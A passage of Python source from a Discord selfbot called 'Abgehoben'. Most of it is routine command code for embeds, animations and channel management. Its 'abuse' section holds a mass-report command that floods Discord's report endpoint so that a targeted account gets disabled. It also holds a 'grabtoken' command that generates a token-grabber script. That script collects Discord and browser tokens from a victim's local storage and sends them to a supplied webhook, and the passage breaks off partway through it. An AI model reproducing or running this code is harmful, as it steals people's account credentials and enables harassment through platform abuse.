        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass

        commandsfoundtotalamount = 0
        commandsfoundamount = 0
        commandsfound = ""
        for i in client.walk_commands():
            if keyword.lower() in str(i.help).lower() or keyword.lower() in str(i.name).lower():
                commandsfoundtotalamount += 1
                if commandsfoundamount != 10:
                    commandsfoundamount += 1
                    if json.load(open('./Files/config.json'))['plaintextmode']:
                        commandsfound += f"[ {i.brief} ]\n;{i.help}\n\n"
                    else:
                        commandsfound += f"**{i.brief}**\n`{i.help}`\n\n"

        if commandsfoundtotalamount == 0:
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"No commands found with `{keyword}` containing. *{config.prefix}about <command>*", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        elif commandsfoundtotalamount < 10:
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Found **{commandsfoundtotalamount}** commands with `{keyword}` containing. *{config.prefix}about <command>*\n\n{commandsfound}", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        elif commandsfoundtotalamount == 10:
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Found **10** commands with `{keyword}` containing. *{config.prefix}about <command>*\n\n{commandsfound}", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        elif commandsfoundtotalamount > 10:
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Found **{commandsfoundtotalamount}** commands with `{keyword}` containing. Showing first **10** results. *{config.prefix}about <command>*\n\n{commandsfound}", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)

    @Abgehoben.command(brief="embed <\"title\"> (\"description\")")
    async def embed(self, ctx, title, description: str = ""):
        """Generates a custom embed."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        embed = discord.Embed(title=title, description=description, color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await ctx.send(embed=embed)

    @Abgehoben.command(brief="ghostping <@user>")
    async def ghostping(self, ctx):
        """Ghostpings a user without him knowing."""
        try:
            await ctx.message.delete()
        except:
            pass

    @Abgehoben.command(brief="cleanterminal")
    async def cleanterminal(self, ctx):
        """Cleans the Terminal so it dont looks trashy and overflooded."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        try:
            os.system("cls")
            start()
        except:
            pass
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Cleaned terminal.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)
    
    @Abgehoben.command(brief="reload")
    async def reload(self, ctx):
        """Reloads the whole SB."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        try:
            os.execv(sys.executable, ['python'] + sys.argv)
        except:
            pass
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Reloaded Selfbot.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)

    @Abgehoben.command(brief="saveallcommands")
    async def saveallcommands(self, ctx):
        """Save all commands to a .txt"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        totalcommandnumber = 0
        saveallcommands = ""
        for x in client.cogs:
            saveallcommands += "\n\n[ "+x+" ]"
            for c in self.client.get_cog(x).get_commands():
                if not c.hidden:
                    saveallcommands += "\n - "+str(c.brief)
        for cmd in client.walk_commands():
            totalcommandnumber += 1
        with open('./Files/commandlist.txt', 'w') as f:
            f.write(f"ABGEHOBEN - {totalcommandnumber} COMMANDS - (UNDER COMMANDS ARE COUNTED TO)\n"+saveallcommands)

        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Saved all commands to ./Files/commandlist.txt.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)

    @Abgehoben.command(brief="spotify (@user)")
    async def spotify(self, ctx, member: discord.Member = None):
        """Information about song the user is Listening."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member == None:
            member = ctx.author
        if member.activities:
            for activity in member.activities:
                if isinstance(activity, Spotify):
                    songstartedat = activity.start
                    songdurationduration = str(datetime.now() - songstartedat)
                    songdurationminutes = songdurationduration.split(":")[1]
                    songdurationseconds = str(songdurationduration.split(":")[2]).split(".")[0]
                    songartists = ""
                    for i in activity.artists: songartists += i+", "

                    embed = discord.Embed(title = f"{member.name}'s Spotify", color = activity.color)
                    embed.set_thumbnail(url=activity.album_cover_url)
                    embed.add_field(name="SONG", value=f"[{activity.title}](https://open.spotify.com/track/{activity.track_id})")
                    embed.add_field(name="ALBUM", value=activity.album)
                    embed.add_field(name="ARTISTS", value=songartists[:-2])
                    embed.add_field(name="TIMELINE", value=f"`{songdurationminutes}:{songdurationseconds} |▬▬▬▬▬▬▬▬▬▬▬▬ « ▶ » ▬▬▬▬▬▬▬▬▬▬▬▬| {dateutil.parser.parse(str(activity.duration)).strftime('%M:%S')}`", inline=False)
                    embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url="https://cdn.icon-icons.com/icons2/836/PNG/512/Spotify_icon-icons.com_66783.png")
                    await send_message_in_mode(ctx, embed)
        else:
            await ctx.send(f"⚠️ `{member}` is not listening to Spotify.", delete_after=2)
    @Abgehoben.command(brief="passwordgen (Chars of the Password)")
    async def passwordgen(self,ctx, range0=25):
        """Generate a Random Password"""
        await ctx.message.delete()
        if range0 > 800 or range0 < 10:
            embed = discord.Embed(title="Password Generator 🔒",description="**Error!**   Look at the Console to see the Error!", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await ctx.send(embed=embed)
            return print(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}PASSWORD{theme.color1}]{theme.color2} Only 10 -> 800 Chars {theme.color1}available {theme.color2}. Please try Again!")
        password = ''.join([random.choice(string.ascii_letters + string.digits + string.punctuation.replace('`', '-')) for n in range(range0)])
        try:
            embed = discord.Embed(title="Password Generator 🔒",description="**Sucess!**  your Generated Password is in the Console!", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await ctx.send(embed=embed)
            yesorno = input(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}PASSWORD{theme.color1}]{theme.color2} Do you wanna post the Password in the Chat?  {theme.color1}if you want to post it in the Chat just type {theme.color2}yes. if no just write no! \n")
            if yesorno == "yes":
                await ctx.send(f"```{password}```")
            else:
                print(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}PASSWORD{theme.color1}]{theme.color2} Password Generated -> {password} {theme.color1}if you want {theme.color2}a new password. then run the Command again!")
        except Exception as e:
            print(e)

animatedembedmessage = False
animatedmatrixmessage = False
class animated(commands.Cog):
    """Animated text commands;This commands will not need any special permissions."""
    def __init__(self, client):
      self.client = client

    @commands.command(brief="customanimation <txtfilename>")
    async def customanimation(self, ctx, *, name: str):
        """Send a customanimated message from a .txt file."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if os.path.exists("./Files/Animatedtext/"+name+".txt"):
            animatedmessage = None
            for i in open("./Files/Animatedtext/"+name+".txt"):
                if animatedmessage == None:
                    animatedmessage = await ctx.send(i.replace("\n", "", 1))
                else:
                    try:
                        await animatedmessage.edit(content=i.replace("\n", "", 1))
                    except:
                        pass
                await asyncio.sleep(1.50)
        else:
            animatetxt = ""
            for file in os.listdir("./Files/Animatedtext/"):
                if file.endswith(".txt"):
                    animatetxt += f"\n - `"+str(file).replace(".txt", "")+"`"
            await ctx.send(f"⚠️ There is no .txt named `{name}`, Select one of the listed below.{animatetxt}", delete_after=2)

    @commands.command(brief="animatedembed (\"title\") (\"description\")")
    async def animatedembed(self, ctx, title = None, description = ""):
        """Send a RGB embed."""
        global animatedembedmessage
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if animatedembedmessage == False:
            animatedembedmessage = True
            embed = discord.Embed(title=title, description=description, color=0x000000)
            animatedmessage = await ctx.send(embed=embed)
        elif animatedembedmessage == True or title == None:
            animatedembedmessage = False
            await ctx.send(f"⚠️ Stopped `Animatedembed`. `(It may take sometime to stop.)`", delete_after=2)
        while animatedembedmessage:
            try:
                embed = discord.Embed(title=title, description=description, color=0x17fc03)
                await animatedmessage.edit(embed=embed)
                await asyncio.sleep(2)
                embed = discord.Embed(title=title, description=description, color=0x03fcf4)
                await animatedmessage.edit(embed=embed)
                await asyncio.sleep(2)
                embed = discord.Embed(title=title, description=description, color=0x0335fc)
                await animatedmessage.edit(embed=embed)
                await asyncio.sleep(2)
                embed = discord.Embed(title=title, description=description, color=0xca03fc)
                await animatedmessage.edit(embed=embed)
                await asyncio.sleep(2)
                embed = discord.Embed(title=title, description=description, color=0xfc0341)
                await animatedmessage.edit(embed=embed)
                await asyncio.sleep(2)
                embed = discord.Embed(title=title, description=description, color=0xfcd703)
                await animatedmessage.edit(embed=embed)
                await asyncio.sleep(2)
            except:
                animatedembedmessage = False

    @commands.command(brief="animatedtext <\"text\"> (delay)")
    async def animatedtext(self, ctx, text, delay: int = 0):
        """Send a animated text."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        animatedtext = None
        texttosend = ""
        for i in text:
            if animatedtext == None:
                texttosend += i
                animatedtext = await ctx.send(texttosend)
                await asyncio.sleep(delay)
            else:
                texttosend += i
                try:
                    await animatedtext.edit(content=texttosend)
                except:
                    pass
                await asyncio.sleep(delay)

    @commands.command(brief="countto <number> (delay)")
    async def countto(self, ctx, countto: int, delay: int=1):
        """Count to a custom number."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        currentcountnumber = 0
        currentcountmessage = None
        for i in range(countto+1):
            if currentcountmessage == None:
                currentcountmessage = await ctx.send("0")
                currentcountnumber += 1
                await asyncio.sleep(delay)
            else:
                try:
                    await currentcountmessage.edit(content=currentcountnumber)
                except:
                    pass
                currentcountnumber += 1
                await asyncio.sleep(delay)

    @commands.command(brief="animatedmatrixtext <\"text\"> (delay)")
    async def animatedmatrixtext(self, ctx, text: str = None, delay: int=1):
        """Create a animated matrix text."""
        global animatedmatrixmessage
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if animatedmatrixmessage == False:
            animatedmatrixmessage = True
            animatedmessage = await ctx.send("` "+text.upper()+" `")
        elif animatedmatrixmessage == True or text == None:
            animatedmatrixmessage = False
            await ctx.send(f"⚠️ Stopped `Matrixtext`. `(It may take sometime to stop.)`", delete_after=2)
        while True:
            try:
                lastchar = text[-1].upper()
                text = lastchar+text[:-1].upper()
                await animatedmessage.edit(content="` "+text+" `")
                await asyncio.sleep(delay)
            except:
                animatedmatrixmessage = False

class moderation(commands.Cog):
    """Moderating commands;For this commands you will need special permissions."""
    def __init__(self, client):
      self.client = client

    @Abgehoben.command(brief="textchannel <\"name\">")
    async def textchannel(self, ctx, name: str):
        """Create a text channel"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        try:
            await ctx.guild.create_text_channel(name)
        except:
            pass
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Created a `text` channel.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='Type',value=f"`Text`",inline=True)
        embed.add_field(name='Name',value=f"`{name}`",inline=True)
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)

    @Abgehoben.command(brief="voicechannel <\"name\">")
    async def voicechannel(self, ctx, name: str):
        """Create a voice channel"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        try:
            await ctx.guild.create_voice_channel(name)
        except:
            pass
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Created a `voice` channel.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='Type',value=f"`Voice`",inline=True)
        embed.add_field(name='Name',value=f"`{name}`",inline=True)
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)

    @Abgehoben.command(brief="stagechannel <\"name\">")
    async def stagechannel(self, ctx, name: str):
        """Create a stage channel (community)"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        try:
            await ctx.guild.create_stage_channel(name)
        except:
            pass
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Created a `stage` channel.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='Type',value=f"`Stage`",inline=True)
        embed.add_field(name='Name',value=f"`{name}`",inline=True)
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)

    @Abgehoben.command(brief="category <\"name\">")
    async def category(self, ctx, name: str):
        """Create a new category"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        try:
            await ctx.guild.create_category(name)
        except:
            pass
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Created a `category` channel.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='Type',value=f"`Category`",inline=True)
        embed.add_field(name='Name',value=f"`{name}`",inline=True)
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)

    @Abgehoben.command(brief="purge (amount) (channel)")
    async def purge(self, ctx, amount: int = 10, channel: discord.TextChannel=None):
        """Purges a choosen amount of messages."""
        if channel == None:
            channel = ctx.channel
        if isinstance(ctx.channel, discord.channel.DMChannel):
            async for msg in ctx.message.channel.history(limit=amount + 1):
                if msg.author.id == client.user.id:
                    try:
                        await msg.delete()
                    except:
                        pass
        else:
            try:
                await channel.purge(limit=amount + 1)
            except:
                pass

class abuse(commands.Cog):
    """Abuse commands;Most of this commands will need special permissions."""
    def __init__(self, client):
      self.client = client
    @Abgehoben.command(brief="massreport <amount of reports> <yourtoken> <reason> <channel id> <guild id> <message id>")
    async def massreport(self,ctx, amount: int, yourtoken, reason, channelid, guildid, messageid):
        """Mass Report an User to Disable his account may ratelimit your IP on Discord API"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        sent = 0
        
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Mass Report", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        embed.add_field(name='Type',value=f"`Reporting`",inline=True)
        lol = await ctx.send(embed=embed)
        token = yourtoken
        headers = {'Authorization': token, 'Content-Type':  'application/json'}  
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if r.status_code == 200:
            pass
        else:
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Mass Report", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.add_field(name='Type',value=f"`401`",inline=True)
            embed.add_field(name='Error Invaild Token',value=f"`You gave a wrong token`",inline=True)
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await lol.edit(embed=embed)
        payload = {
        'channel_id': channelid,
        'guild_id': guildid,
        'message_id': messageid,
        'reason': reason
        }
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
        'Authorization': token,
        'Content-Type': 'application/json'
        }
        
        for i in range(amount):
            r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
            
            if r.status_code == 201:
                
                sent += 1
                for i in range(amount):
                    await asyncio.sleep(0.9)
                    embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Mass Report", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                    embed.add_field(name='Reports Send',value=f"`{int(sent)}`",inline=True)
                    embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
                    embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
                    await lol.edit(embed=embed)
            elif r.status_code == 401:
                embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Mass Report", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                embed.add_field(name='Type',value=f"`401`",inline=True)
                embed.add_field(name='Error Invaild Token',value=f"`You gave a wrong token`",inline=True)
                embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
                embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
                await lol.edit(embed=embed)
            else:
                embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Mass Report", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                embed.add_field(name='Type',value=f"`404`",inline=True)
                embed.add_field(name='Error API Ratelimit',value=f"`Your IP got ratelimited by Discord`",inline=True)
                embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
                embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
                print(r.content)
                await lol.edit(embed=embed)

    @massreport.error
    async def massreport_error(self, ctx, error):
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Mass Report", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='Error!',value=f"`While Report`",inline=True)
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        lol = await ctx.send(embed=embed)
        reasons = f"""
        `1. Illegal Content` 
        `2. Harrassment`
        `3. Spam or Phishing Links`
        `4. Self harm`
        `5. NSFW Content`
        """
        if isinstance(error, discord.ext.commands.errors.MissingRequiredArgument):
                embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Mass Report", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                embed.add_field(name='Type',value=f"`Select Reason`",inline=True)
                embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
                embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
                embed.add_field(name='Reasons',value=f"{reasons}",inline=True)
                await lol.edit(embed=embed)
   

    @Abgehoben.command(brief="dmblocked <userid> <message>")
    async def dmblocked(self, ctx, userid, *, message):
        """DM a user that you blocked (Not the other way!)."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        user = await client.fetch_user(userid)
        try:
            await user.send(message)
        except:
            pass
    

    @Abgehoben.command(brief="grabtoken <Name of python file> <your webhook>")
    async def grabtoken(self,ctx,name,webhook):
        """Generate a Tokengrabber in a python file!"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        fname = f'{name}.py'

        data = '''
import os
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
WEBHOOK_URL = "''' + webhook + '''"
PATHS = {
    "Discord": ROAMING + "\\\\Discord",
    "Discord Canary": ROAMING + "\\\\discordcanary",
    "Discord PTB": ROAMING + "\\\\discordptb",
    'Discord Development': ROAMING + '\\\\discorddevelopment',
    "Google Chrome": LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera": ROAMING + "\\\\Opera Software\\\\Opera Stable",
    "Brave": LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    "Yandex": LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
}
def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v8/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass
def getTokens(path):
    try:
        path += "\\\\Local Storage\\\\leveldb"
        tokens = []
